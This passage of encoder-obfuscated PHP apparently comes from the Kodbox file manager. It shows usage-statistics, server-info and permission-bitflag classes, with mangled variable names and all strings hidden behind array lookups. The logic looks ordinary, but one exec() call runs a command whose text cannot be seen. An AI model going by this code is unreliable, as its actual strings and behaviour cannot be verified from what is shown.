$¹ë‹á³ =& $this->task; if ($¹ë‹á³[$’à°–ƒÇ[1903]] == $’à°–ƒÇ[390]) { $¹ë‹á³[$’à°–ƒÇ[1903]] = $’à°–ƒÇ[110]; } $this->update(); } public function copyFileEnd($â×­•Ç, $±Ö—ó‰Ÿ, $°Ş”›µ¨, $İ¬“ë“¯, $¸¾ŒˆÆ£, $ÊæÒğ) { $Ú¹şÀÚî =& $_SERVER[¼’ç§¼´]; $ë¦‹¬Æ =& $this->task; $ë¦‹¬Æ[$Ú¹şÀÚî[1838]] = $ë¦‹¬Æ[$Ú¹şÀÚî[1837]]; $ë¦‹¬Æ[$Ú¹şÀÚî[1842]] += $ë¦‹¬Æ[$Ú¹şÀÚî[1837]]; $ë¦‹¬Æ[$Ú¹şÀÚî[1839]] = $Ú¹şÀÚî[12]; $this->update(); } public function zipEvent($…ø¯—¡Ş, $Ô¡â‰ÂÌ, $–Õ´‘Ì, $”¨®ŠÆ) { $ºğÇùİâ =& $_SERVER[¼’ç§¼´]; $ƒê §ô =& $this->task; $ƒê §ô[$ºğÇùİâ[1835]] = get_path_this($Ô¡â‰ÂÌ); $ƒê §ô[$ºğÇùİâ[1837]] = $”¨®ŠÆ; $ƒê §ô[$ºğÇùİâ[1838]] = $–Õ´‘Ì; $ƒê §ô[$ºğÇùİâ[1151]] = $…ø¯—¡Ş == $ºğÇùİâ[1911] ? $ºğÇùİâ[1906] : $ºğÇùİâ[1907]; $ƒê §ô[$ºğÇùİâ[1839]] = $ºğÇùİâ[12]; $ƒê §ô[$ºğÇùİâ[851]] = $”¨®ŠÆ; $ƒê §ô[$ºğÇùİâ[1903]] = $ºğÇùİâ[390]; $this->update(); } public function nameParse($ÛØ•¸É€) { $¸Ø—Ÿóö =& $_SERVER[¼’ç§¼´]; $ëò”üÚ =& $this->task; if ($ëò”üÚ[$¸Ø—Ÿóö[1784]] < $ëò”üÚ[$¸Ø—Ÿóö[1149]]) { $ÀºĞÏ©ã = get_path_this($ÛØ•¸É€); if (strstr($ÀºĞÏ©ã, $¸Ø—Ÿóö[10])) { $ëò”üÚ[$¸Ø—Ÿóö[1784]] += 1; } } if ($ëò”üÚ[$¸Ø—Ÿóö[1903]] == $¸Ø—Ÿóö[1288]) { $ëò”üÚ[$¸Ø—Ÿóö[1903]] = $¸Ø—Ÿóö[390]; } $ëò”üÚ[$¸Ø—Ÿóö[1835]] = $ÛØ•¸É€; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¤ŠñÕòï) { $Â£×””ƒ =& $_SERVER[¼’ç§¼´]; $×ş°µĞ = array($Â£×””ƒ[676] => array($Â£×””ƒ[33] => $Â£×””ƒ[1912], $Â£×””ƒ[352] => array($Â£×””ƒ[284], $Â£×””ƒ[853], $Â£×””ƒ[1913], $Â£×””ƒ[1914])), $Â£×””ƒ[1915] => array($Â£×””ƒ[33] => $Â£×””ƒ[1916], $Â£×””ƒ[352] => array($Â£×””ƒ[284], $Â£×””ƒ[851], $Â£×””ƒ[1917], $Â£×””ƒ[1918], $Â£×””ƒ[1919]))); if (!isset($×ş°µĞ[$¤ŠñÕòï])) { return !1; } $this->optionType = $×ş°µĞ[$¤ŠñÕòï][$Â£×””ƒ[33]]; $this->field = $×ş°µĞ[$¤ŠñÕòï][$Â£×””ƒ[352]]; return !0; } public function listData($—º›§³Œ = false, $¬Ğ²“…Œ = "\x6d\x6f\144\151\x66\x79\x54\x69\155\x65", $õˆ‚¾ = false) { return parent::listData($—º›§³Œ, $¬Ğ²“…Œ, $õˆ‚¾); } public function trendList($Ò¢Ù€¦ò) { $äòšöå‰ =& $_SERVER[¼’ç§¼´]; $©›­óòô = $this->listData(); if ($©›­óòô) { $…ÂéÒÖÛ = end($©›­óòô); $ºÃëš·¿ = date($äòšöå‰[1920], strtotime($äòšöå‰[1921])); if ($…ÂéÒÖÛ[$äòšöå‰[284]] == $ºÃëš·¿) { return $©›­óòô; } $Ì¸Ïµº“ = strtotime($…ÂéÒÖÛ[$äòšöå‰[284]]); } if (!isset($Ì¸Ïµº“)) { $œšö‚¼« = $Ò¢Ù€¦ò == $äòšöå‰[676] ? $äòšöå‰[608] : $äòšöå‰[913]; $Ì¸Ïµº“ = Model($œšö‚¼«)->min($äòšöå‰[233]); } $Ë£÷·¥³ = $äòšöå‰[1922] . ucfirst($Ò¢Ù€¦ò); $‘¼ˆ»‘ = $this->dateList($Ì¸Ïµº“); foreach ($‘¼ˆ»‘ as $ºÃëš·¿) { $this->{$Ë£÷·¥³}($ºÃëš·¿); } return $this->listData(); } private function dateList($ä¶Ğô·) { $ˆüû¥Ûì =& $_SERVER[¼’ç§¼´]; $Şµâ¾°ı = $ä¶Ğô·; $…îœÎ‰Ü = strtotime($ˆüû¥Ûì[1921]); $ØÅ—™ = array(); while ($Şµâ¾°ı <= $…îœÎ‰Ü) { $ØÅ—™[] = date($ˆüû¥Ûì[1920], $Şµâ¾°ı); $Şµâ¾°ı = strtotime($ˆüû¥Ûì[1923], $Şµâ¾°ı); } return $ØÅ—™; } public function _recordUser($Àò™Û«° = '') { $åáÆóÇ =& $_SERVER[¼’ç§¼´]; $í€‰‰¾» = strtotime(date($åáÆóÇ[1924], strtotime($Àò™Û«°))); $Çİ‡ã÷‚ = strtotime(date($åáÆóÇ[1925], strtotime($Àò™Û«°))); $ØÓÚÏ§‚ = array($åáÆóÇ[233] => array($åáÆóÇ[1099], $Çİ‡ã÷‚)); $ó“Í§íô = Model($åáÆóÇ[608])->where($ØÓÚÏ§‚)->count($åáÆóÇ[1783]); $ØÓÚÏ§‚[$åáÆóÇ[233]] = array($åáÆóÇ[410], array($í€‰‰¾», $Çİ‡ã÷‚)); $ˆ®ûî¿Æ = Model($åáÆóÇ[608])->where($ØÓÚÏ§‚)->count($åáÆóÇ[1783]); $ØÓÚÏ§‚[$åáÆóÇ[33]] = $åáÆóÇ[1926]; $ÅÎº¾â÷ = Model($åáÆóÇ[1927])->where($ØÓÚÏ§‚)->count($åáÆóÇ[1928]); $çÌÖÄæ¹ = array($åáÆóÇ[284] => $Àò™Û«°, $åáÆóÇ[853] => (int) $ó“Í§íô, $åáÆóÇ[1913] => (int) $ˆ®ûî¿Æ, $åáÆóÇ[1914] => (int) $ÅÎº¾â÷); return $this->insert($çÌÖÄæ¹); } public function _recordStore($ÜõÑŸıç = '') { $©¨‹»÷µ =& $_SERVER[¼’ç§¼´]; $ş…Öóû¿ = strtotime(date($©¨‹»÷µ[1925], strtotime($ÜõÑŸıç))); $À¯äÏèå = array($©¨‹»÷µ[233] => array($©¨‹»÷µ[1099], $ş…Öóû¿)); $†ØˆÚ‡ = Model($©¨‹»÷µ[555])->where($À¯äÏèå)->sum($©¨‹»÷µ[79]); $À¯äÏèå[$©¨‹»÷µ[496]] = 0; $ßÅ–‡‡¹ = Model($©¨‹»÷µ[913])->where($À¯äÏèå)->sum($©¨‹»÷µ[79]); $À¯äÏèå[$©¨‹»÷µ[190]] = 1; $šÖ‘â…ä = Model($©¨‹»÷µ[913])->where($À¯äÏèå)->sum($©¨‹»÷µ[79]); $À¯äÏèå[$©¨‹»÷µ[190]] = 2; $õôÖµŸ„ = Model($©¨‹»÷µ[913])->where($À¯äÏèå)->sum($©¨‹»÷µ[79]); $’ºôàì· = array($©¨‹»÷µ[284] => $ÜõÑŸıç, $©¨‹»÷µ[851] => (int) $ßÅ–‡‡¹, $©¨‹»÷µ[1917] => (int) $†ØˆÚ‡, $©¨‹»÷µ[1918] => (int) $šÖ‘â…ä, $©¨‹»÷µ[1919] => (int) $õôÖµŸ„); return $this->insert($’ºôàì·); } public function trend($¶×Ñõ¡Û, $ÖÅ®˜Ï) { $øãÓ¦ñĞ =& $_SERVER[¼’ç§¼´]; if (!$this->init($¶×Ñõ¡Û)) { return !1; } $»š±Ç¬ = $this->trendList($¶×Ñõ¡Û); if ($»š±Ç¬ && $ÖÅ®˜Ï != $øãÓ¦ñĞ[1755]) { $²ÉóÛúÔ = $»š±Ç¬[0][$øãÓ¦ñĞ[284]]; $å›øŸ– = $this->validDate($ÖÅ®˜Ï, $²ÉóÛúÔ); $Â›ÕÜ´¸ = array(); $ê·‰¤÷› = array_to_keyvalue($»š±Ç¬, $øãÓ¦ñĞ[284]); foreach ($å›øŸ– as $ÄßÕ¾ÍŠ) { if (isset($ê·‰¤÷›[$ÄßÕ¾ÍŠ])) { $ñ…éØòò = $ê·‰¤÷›[$ÄßÕ¾ÍŠ]; } else { $ñ…éØòò = end($»š±Ç¬); $ñ…éØòò[$øãÓ¦ñĞ[284]] = $ÄßÕ¾ÍŠ; if ($¶×Ñõ¡Û == $øãÓ¦ñĞ[676]) { $ñ…éØòò[$øãÓ¦ñĞ[1913]] = $ñ…éØòò[$øãÓ¦ñĞ[1914]] = 0; } } $Â›ÕÜ´¸[] = $ñ…éØòò; } $»š±Ç¬ = $Â›ÕÜ´¸; } $É–ñ§¤ = array($øãÓ¦ñĞ[676] => array($øãÓ¦ñĞ[853] => LNG($øãÓ¦ñĞ[1929]), $øãÓ¦ñĞ[1913] => LNG($øãÓ¦ñĞ[1930]), $øãÓ¦ñĞ[1914] => LNG($øãÓ¦ñĞ[1931])), $øãÓ¦ñĞ[1915] => array($øãÓ¦ñĞ[851] => LNG($øãÓ¦ñĞ[1932]), $øãÓ¦ñĞ[1917] => LNG($øãÓ¦ñĞ[1933]), $øãÓ¦ñĞ[1918] => LNG($øãÓ¦ñĞ[1934]), $øãÓ¦ñĞ[1919] => LNG($øãÓ¦ñĞ[1935]))); $•Ã÷ÈÉã = array($øãÓ¦ñĞ[676] => $øãÓ¦ñĞ[1936], $øãÓ¦ñĞ[1915] => $øãÓ¦ñĞ[79]); if (empty($»š±Ç¬)) { $ÄßÕ¾ÍŠ = date($øãÓ¦ñĞ[1920], strtotime($øãÓ¦ñĞ[1921])); $â‡ï£© = array($øãÓ¦ñĞ[284] => $ÄßÕ¾ÍŠ); foreach ($É–ñ§¤[$¶×Ñõ¡Û] as $³éØ¾”Ğ => $åÄ çôÖ) { $â‡ï£©[$³éØ¾”Ğ] = 0; } $»š±Ç¬[] = $â‡ï£©; } $€ó‘Å– = array(); foreach ($»š±Ç¬ as $åÄ çôÖ) { if ($¶×Ñõ¡Û == $øãÓ¦ñĞ[1915] && $åÄ çôÖ[$øãÓ¦ñĞ[1917]] > $åÄ çôÖ[$øãÓ¦ñĞ[851]]) { $åÄ çôÖ[$øãÓ¦ñĞ[1917]] = $åÄ çôÖ[$øãÓ¦ñĞ[851]]; } foreach ($É–ñ§¤[$¶×Ñõ¡Û] as $³éØ¾”Ğ => $Í¢Âµº) { $ñ…éØòò = array($øãÓ¦ñĞ[284] => $åÄ çôÖ[$øãÓ¦ñĞ[284]], $øãÓ¦ñĞ[1671] => $Í¢Âµº); $ñ…éØòò[$•Ã÷ÈÉã[$¶×Ñõ¡Û]] = isset($åÄ çôÖ[$³éØ¾”Ğ]) ? $åÄ çôÖ[$³éØ¾”Ğ] : 0; $€ó‘Å–[] = $ñ…éØòò; } } return $€ó‘Å–; } public function validDate($ò“€¹û, $˜—îéíá) { $ãıµğÅß =& $_SERVER[¼’ç§¼´]; $Œ£ÄÙ¸Ş = date($ãıµğÅß[1920], strtotime($ãıµğÅß[1921])); $¢©ĞÖÑ• = array($Œ£ÄÙ¸Ş); switch ($ò“€¹û) { case $ãıµğÅß[1762]: $´ó¡ñƒ = mktime(0, 0, 0, date($ãıµğÅß[1937]), date($ãıµğÅß[1461]) - date($ãıµğÅß[1551]) + 7 - 7, date($ãıµğÅß[1938])); $½ó¾Î‹È = 0; do { $ºš°æß¿ = date($ãıµğÅß[1920], $´ó¡ñƒ - 3600 * 24 * 7 * $½ó¾Î‹È); $¢©ĞÖÑ•[] = $ºš°æß¿; $½ó¾Î‹È++; } while ($˜—îéíá < $ºš°æß¿); break; case $ãıµğÅß[1760]: $½ó¾Î‹È = 1; do { $ê±÷©½µ = date($ãıµğÅß[1939], strtotime("\55\40{$½ó¾Î‹È}\x20\x6d\x6f\156\164\x68\x73")); $¢©ĞÖÑ•[] = $ê±÷©½µ; $½ó¾Î‹È++; } while ($˜—îéíá < $ê±÷©½µ); break; case $ãıµğÅß[1940]: $…½Ú§¥à = (int) date($ãıµğÅß[1938], strtotime($˜—îéíá)); $‹â€èè… = (int) date($ãıµğÅß[1938]); if ($…½Ú§¥à >= $‹â€èè…) { break; } for ($…½Ú§¥à; $…½Ú§¥à < $‹â€èè…; $…½Ú§¥à++) { $¢©ĞÖÑ•[] = $…½Ú§¥à . $ãıµğÅß[1941]; } break; default: break; } if ($˜—îéíá > end($¢©ĞÖÑ•)) { array_pop($¢©ĞÖÑ•); } sort($¢©ĞÖÑ•); return $¢©ĞÖÑ•; } public function listTable($¤ÑŠÄØã) { $ãœç¨¥ = ucfirst($¤ÑŠÄØã); return Model($ãœç¨¥)->listData(); } public function option($ØÙ—şªà) { $‚ÉÆ›²‘ = $_SERVER[¼’ç§¼´][1942] . ucfirst($ØÙ—şªà); return $this->{$‚ÉÆ›²‘}(); } private function optionUser() { $ª‹Íî¶ü =& $_SERVER[¼’ç§¼´]; $¥™Œ‰éî = Model($ª‹Íî¶ü[608])->count($ª‹Íî¶ü[1783]); $“ÚÃ˜ÀÚ = Model($ª‹Íî¶ü[608])->where($ª‹Íî¶ü[1943])->count($ª‹Íî¶ü[1783]); $Â›ÊûÅà = intval($GLOBALS[$ª‹Íî¶ü[6]][$ª‹Íî¶ü[426]][$ª‹Íî¶ü[1728]]) / 3600; $İ³ùİ”ã = strtotime("\55{$Â›ÊûÅà}\40\150\157\x75\x72\x73"); $Ğµˆ£“ = strtotime(date($ª‹Íî¶ü[1924])); if ($İ³ùİ”ã < $Ğµˆ£“) { $İ³ùİ”ã = $Ğµˆ£“; } $›ˆù®ëğ = array($ª‹Íî¶ü[1944] => array($ª‹Íî¶ü[1100], $İ³ùİ”ã)); $ö³â‰Ç¹ = (int) Model($ª‹Íî¶ü[608])->where($›ˆù®ëğ)->count($ª‹Íî¶ü[1783]); if (!$ö³â‰Ç¹) { $ö³â‰Ç¹ = 1; } $›ˆù®ëğ = array($ª‹Íî¶ü[1944] => array($ª‹Íî¶ü[1100], $Ğµˆ£“)); $ËÆÀÁ®‚ = Model($ª‹Íî¶ü[608])->where($›ˆù®ëğ)->count($ª‹Íî¶ü[1783]); return array($ª‹Íî¶ü[846] => (int) $¥™Œ‰éî, $ª‹Íî¶ü[1945] => (int) ($¥™Œ‰éî - $“ÚÃ˜ÀÚ), $ª‹Íî¶ü[1946] => (int) $“ÚÃ˜ÀÚ, $ª‹Íî¶ü[1947] => (int) $ËÆÀÁ®‚, $ª‹Íî¶ü[1948] => $ö³â‰Ç¹); } private function optionFile() { $ç¨Šåì× =& $_SERVER[¼’ç§¼´]; $»ÄÉ—À¤ = $this->sourceSize(); $İšä‚‡ = $»ÄÉ—À¤[$ç¨Šåì×[79]]; $ªĞ¼ôÁ = $»ÄÉ—À¤[$ç¨Šåì×[1917]]; $ÅœÂü = Model($ç¨Šåì×[913])->where(array($ç¨Šåì×[496] => 0))->count($ç¨Šåì×[193]); $®°áËà = array($ç¨Šåì×[496] => 0, $ç¨Šåì×[233] => array($ç¨Šåì×[1100], strtotime(date($ç¨Šåì×[1924])))); $½éÉî»ú = Model($ç¨Šåì×[913])->where($®°áËà)->sum($ç¨Šåì×[79]); $ßÚ€­é’ = Model($ç¨Šåì×[913])->where($®°áËà)->count($ç¨Šåì×[193]); return array($ç¨Šåì×[851] => $İšä‚‡, $ç¨Šåì×[1917] => $ªĞ¼ôÁ, $ç¨Šåì×[1949] => $İšä‚‡ - $ªĞ¼ôÁ, $ç¨Šåì×[1950] => (int) $½éÉî»ú, $ç¨Šåì×[853] => (int) $ÅœÂü, $ç¨Šåì×[1951] => (int) $ßÚ€­é’); } private function optionAccess() { $šæ©áèå =& $_SERVER[¼’ç§¼´]; return array($šæ©áèå[846] => $this->typeLogCnt(), $šæ©áèå[110] => $this->typeLogCnt($šæ©áèå[110]), $šæ©áèå[536] => $this->typeLogCnt($šæ©áèå[536]), $šæ©áèå[1952] => $this->typeLogCnt($šæ©áèå[1952]), $šæ©áèå[1953] => $this->typeLogCnt($šæ©áèå[1953]), $šæ©áèå[676] => $this->typeLogCnt($šæ©áèå[12], $šæ©áèå[1928])); } private function typeLogCnt($à·Ÿí‘ = '', $µ¢³Âç½ = "\x69\x64") { $›«ÀŒ» =& $_SERVER[¼’ç§¼´]; $ÔüÔÚÎİ = array($›«ÀŒ»[110] => array($›«ÀŒ»[1954], $›«ÀŒ»[1955]), $›«ÀŒ»[536] => array($›«ÀŒ»[1956], $›«ÀŒ»[1957]), $›«ÀŒ»[1952] => array($›«ÀŒ»[1958], $›«ÀŒ»[1959], $›«ÀŒ»[1960]), $›«ÀŒ»[1953] => array($›«ÀŒ»[1961], $›«ÀŒ»[1962]), $›«ÀŒ»[1963] => array($›«ÀŒ»[1964], $›«ÀŒ»[1965], $›«ÀŒ»[1966])); $£ûë¡Ô = strtotime(date($›«ÀŒ»[1924])); $Ó¥©øÛ– = array($›«ÀŒ»[233] => array($›«ÀŒ»[1100], $£ûë¡Ô)); if ($à·Ÿí‘) { $Ó¥©øÛ–[$›«ÀŒ»[33]] = array($›«ÀŒ»[7], $ÔüÔÚÎİ[$à·Ÿí‘]); } $Æü¬¿ğ» = Model($›«ÀŒ»[1927])->where($Ó¥©øÛ–)->count($µ¢³Âç½); return (int) $Æü¬¿ğ»; } private function optionServer() { $«†úŒá» =& $_SERVER[¼’ç§¼´]; $ˆÃäìì = $this->diskDriver(); $üªÊšøñ = KodIO::defaultDriver(); $Ê˜è®‚¹ = array($«†úŒá»[906] => $üªÊšøñ[$«†úŒá»[486]]); $šË¿ÌÉ = Model($«†úŒá»[555])->where($Ê˜è®‚¹)->sum($«†úŒá»[79]); $î¡æıî = explode($«†úŒá»[53], $_SERVER[$«†úŒá»[147]]); $„¢Ù©Ó¯ = $î¡æıî[0]; $–áÂñÆÜ = $GLOBALS[$«†úŒá»[6]][$«†úŒá»[21]]; $Û‚„£ü’ = $–áÂñÆÜ[$«†úŒá»[1062]]; if ($Û‚„£ü’ == $«†úŒá»[1050]) { $Ò·‰çª = explode($«†úŒá»[1377], $–áÂñÆÜ[$«†úŒá»[1061]]); $Û‚„£ü’ = $Ò·‰çª[0]; } if ($Û‚„£ü’ == $«†úŒá»[998] || $Û‚„£ü’ == $«†úŒá»[893]) { $½Ñ”Ú‡… = Model()->db()->query($«†úŒá»[1967]); $µ‡°„“ = $½Ñ”Ú‡…[0] && isset($½Ñ”Ú‡…[0][$«†úŒá»[1670]]) ? $½Ñ”Ú‡…[0][$«†úŒá»[1670]] : 0; $Û‚„£ü’ = $«†úŒá»[1968] . ($µ‡°„“ ? $«†úŒá»[8] . $µ‡°„“ : $«†úŒá»[12]); } $Ûª¸¯ = $GLOBALS[$«†úŒá»[6]][$«†úŒá»[426]][$«†úŒá»[915]]; return array($«†úŒá»[1969] => $ˆÃäìì ? $ˆÃäìì[$«†úŒá»[1970]] : 0, $«†úŒá»[1971] => $ˆÃäìì ? $ˆÃäìì[$«†úŒá»[1972]] : 0, $«†úŒá»[1973] => (int) $üªÊšøñ[$«†úŒá»[1970]] * 1024 * 1024 * 1024, $«†úŒá»[1974] => (int) $šË¿ÌÉ, $«†úŒá»[1975] => ucfirst($„¢Ù©Ó¯), $«†úŒá»[1976] => $«†úŒá»[1977] . PHP_VERSION, $«†úŒá»[1978] => phpBuild64() ? 64 : 32, $«†úŒá»[845] => str_replace($«†úŒá»[1218], $«†úŒá»[1078], $Û‚„£ü’), $«†úŒá»[426] => ucfirst($Ûª¸¯), $«†úŒá»[32] => $_SERVER[$«†úŒá»[1979]]); } private function diskDriver() { $Ç»¤× =& $_SERVER[¼’ç§¼´]; $ƒÖ÷à¹ = $Ç»¤×[8]; $œ¦¨†© = $GLOBALS[$Ç»¤×[6]][$Ç»¤×[1394]] == $Ç»¤×[1395]; if ($œ¦¨†©) { $ƒÖ÷à¹ = $Ç»¤×[1980]; if (function_exists($Ç»¤×[1981])) { exec($Ç»¤×[1982], $Ê¶¡´ï»); $ƒÖ÷à¹ = $Ê¶¡´ï»[1] . $Ç»¤×[8]; } } if (!file_exists($ƒÖ÷à¹)) { return; } if (!function_exists($Ç»¤×[1983])) { return; } $¸´éñÂÇ = @disk_total_space($ƒÖ÷à¹); $ğ°Î‰¯ó = $¸´éñÂÇ - @disk_free_space($ƒÖ÷à¹); return array($Ç»¤×[1970] => $¸´éñÂÇ, $Ç»¤×[1972] => $ğ°Î‰¯ó); } public function fileChart($äª™´ñê) { $í‰Ğ†Ç÷ =& $_SERVER[¼’ç§¼´]; if (isset($äª™´ñê[$í‰Ğ†Ç÷[1783]])) { return Model($í‰Ğ†Ç÷[913])->userFileTypeProfile($äª™´ñê[$í‰Ğ†Ç÷[1783]]); } if (isset($äª™´ñê[$í‰Ğ†Ç÷[1984]])) { return Model($í‰Ğ†Ç÷[913])->groupFileTypeProfile($äª™´ñê[$í‰Ğ†Ç÷[1984]]); } $åúÑ›•¼ = $this->sourceSize(); $ÌŞİûíÊ = array($í‰Ğ†Ç÷[192] => 0, $í‰Ğ†Ç÷[190] => 1); $âõÅ¡àï = Model($í‰Ğ†Ç÷[913])->where($ÌŞİûíÊ)->sum($í‰Ğ†Ç÷[79]); $ÌŞİûíÊ[$í‰Ğ†Ç÷[190]] = 2; $µ€õ‡ùú = Model($í‰Ğ†Ç÷[913])->where($ÌŞİûíÊ)->sum($í‰Ğ†Ç÷[79]); return array($í‰Ğ†Ç÷[851] => $åúÑ›•¼[$í‰Ğ†Ç÷[79]], $í‰Ğ†Ç÷[1917] => $åúÑ›•¼[$í‰Ğ†Ç÷[1917]], $í‰Ğ†Ç÷[1918] => (int) $âõÅ¡àï, $í‰Ğ†Ç÷[1919] => (int) $µ€õ‡ùú); } private function sourceSize() { $ğã‚×Ù® =& $_SERVER[¼’ç§¼´]; $³ÃÎ’ä– = Model($ğã‚×Ù®[913])->where(array($ğã‚×Ù®[496] => 0))->sum($ğã‚×Ù®[79]); $˜¯îñˆ¿ = Model($ğã‚×Ù®[555])->sum($ğã‚×Ù®[79]); if ($˜¯îñˆ¿ > $³ÃÎ’ä–) { $˜¯îñˆ¿ = $³ÃÎ’ä–; } return array($ğã‚×Ù®[79] => (int) $³ÃÎ’ä–, $ğã‚×Ù®[1917] => (int) $˜¯îñˆ¿); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $çŒçÕ¾É =& $_SERVER[¼’ç§¼´]; $÷ú›’úî = array(array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1985]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[1987], $çŒçÕ¾É[1988] => 1, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1991]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[1992], $çŒçÕ¾É[1988] => 2, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1993]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[1994], $çŒçÕ¾É[1988] => 3, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1995]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[1996], $çŒçÕ¾É[1988] => 4, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_VIEW), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1997]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[1998], $çŒçÕ¾É[1988] => 5, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[1999]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[2000], $çŒçÕ¾É[1988] => 6, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($çŒçÕ¾É[505] => LNG($çŒçÕ¾É[2001]), $çŒçÕ¾É[1986] => $çŒçÕ¾É[2002], $çŒçÕ¾É[1988] => 7, $çŒçÕ¾É[1989] => 1, $çŒçÕ¾É[1990] => 0)); return $÷ú›’úî; } public static function authCheck($íèÔ¯”æ, $ëŒìÒ) { $Î«İã¿‡ =& $_SERVER[¼’ç§¼´]; $íèÔ¯”æ = intval($íèÔ¯”æ); if (KodUser::isRoot() && $GLOBALS[$Î«İã¿‡[6]][$Î«İã¿‡[2003]]) { return !0; } if ($íèÔ¯”æ <= 0) { return !1; } if (($íèÔ¯”æ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($íèÔ¯”æ & $ëŒìÒ); } public static function authCheckShow($§¸Š©ÜÓ) { return self::authCheck($§¸Š©ÜÓ, self::AUTH_SHOW); } public static function authCheckView($­úˆ¬Í¥) { return self::authCheck($­úˆ¬Í¥, self::AUTH_VIEW); } public static function authCheckDownload($·”Ã®›Ö) { return self::authCheck($·”Ã®›Ö, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ëĞë´Æ¼) { return self::authCheck($ëĞë´Æ¼, self::AUTH_UPLOAD); } public static function authCheckEdit($§ô“å¼«) { return self::authCheck($§ô“å¼«, self::AUTH_EDIT); } public static function authCheckRemove($ÕºëÃÌÚ) { return self::authCheck($ÕºëÃÌÚ, self::AUTH_REMOVE); } public static function authCheckShare($ÉáàÆ•) { return self::authCheck($ÉáàÆ•, self::AUTH_SHARE); } public static function authCheckComment($Úí•Ë¡) { return self::authCheck($Úí•Ë¡, self::AUTH_COMMENT); } public static function authCheckEvent($« ¶ëìŠ) { return self::authCheck($« ¶ëìŠ, self::AUTH_EVENT); } public static function authCheckRoot($ ë¹”€Ÿ) { return self::authCheck($ ë¹”€Ÿ, self::AUTH_ROOT); } public static function authCheckAction($Ò×¯×Ó, $ÒÀƒœÌ) { $Ô÷ØÜŒ§ =& $_SERVER[¼’ç§¼´]; $ï³İ·‹ = array($Ô÷ØÜŒ§[2004] => self::AUTH_VIEW, $Ô÷ØÜŒ§[1288] => self::AUTH_DOWNLOAD, $Ô÷ØÜŒ§[110] => self::AUTH_UPLOAD, $Ô÷ØÜŒ§[1953] => self::AUTH_EDIT, $Ô÷ØÜŒ§[1952] => self::AUTH_REMOVE, $Ô÷ØÜŒ§[1963] => self::AUTH_SHARE, $Ô÷ØÜŒ§[431] => self::AUTH_COMMENT, $Ô÷ØÜŒ§[1770] => self::AUTH_EVENT, $Ô÷ØÜŒ§[2005] => self::AUTH_ROOT); if (!isset($ï³İ·‹[$ÒÀƒœÌ])) { return; } $ïéÇë±§ = $ï³İ·‹[$ÒÀƒœÌ]; $Ò×¯×Ó = intval($Ò×¯×Ó); if ($Ò×¯×Ó <= 0) { return !1; } if (($Ò×¯×Ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ò×¯×Ó & $ïéÇë±§); } public static function authDisable($–äİ—¡¶, $±¹Œ¯³Ó) { if (intval($–äİ—¡¶) <= 0) { return 0; } return intval($–äİ—¡¶) & ~$±¹Œ¯³Ó; } public $optionType = "\x53\x79\x73\x74\x65\x6d\56\163\157\x75\x72\x63\145\101\x75\x74\x68\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\141\165\164\150", "\154\141\142\145\x6c", "\x64\x69\x73\x70\x6c\x61\171", "\163\x79\x73\x74\x65\x6d", "\163\x6f\162\x74"); public function initData() { $üù¾³ Ã = $this->authDefault(); foreach ($üù¾³ Ã as $ßã½…µç) { $this->add($ßã½…µç); } } public function findAuth($—ºïƒş, $ÒÛıç‘û) { $ïÜµô©„ =& $_SERVER[¼’ç§¼´]; $æ¦ºØÈ€ = parent::listData(); foreach ($æ¦ºØÈ€ as $¸ô¸¡í) { $è£õõâõ = intval($¸ô¸¡í[$ïÜµô©„[498]]); if ($è£õõâõ <= 0 || $¸ô¸¡í[$ïÜµô©„[2006]] == 0) { continue; } if (($è£õõâõ & $—ºïƒş) != $—ºïƒş) { continue; } if (($è£õõâõ & $ÒÛıç‘û) != 0) { continue; } return $¸ô¸¡í[$ïÜµô©„[486]]; } return !1; } public function findAuthMax($ßğ¤”É›, $Ò¥¤¼Ó·) { 